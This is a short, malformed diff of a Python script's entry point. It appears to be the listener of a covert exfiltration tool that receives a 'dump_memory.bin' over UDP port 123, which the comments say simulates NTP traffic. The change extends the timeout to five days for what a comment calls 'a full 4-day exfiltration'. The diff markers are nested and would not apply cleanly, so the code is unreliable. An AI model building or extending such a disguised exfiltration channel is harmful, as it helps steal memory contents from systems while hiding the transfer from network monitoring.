@@ -305,8 +305,13 @@ def run_receiver(host, port, output_file, base_timeout=120):
         finally:
             fb_sock.close()
 
-if __name__ == '__main__':
-    host = "0.0.0.0"      # Écoute sur toutes les interfaces
-    port = 123            # Port UDP simulant le trafic NTP (attention: on Linux this port is reserved and may require root privileges)
-    output_file = "dump_memory.bin"
-    run_receiver(host, port, output_file)
+
+ if __name__ == '__main__':
+     host = "0.0.0.0"        # Écoute sur toutes les interfaces
+     port = 123              # Port UDP simulant le trafic NTP (attention: on Linux this port is reserved and may require root privileges)
+     output_file = "dump_memory.bin"
+-    run_receiver(host, port, output_file)
++    # allow up to 5 days for a full 4-day exfiltration
++    run_receiver(host, port, output_file,
++                 base_timeout=60*60*24*5)
+
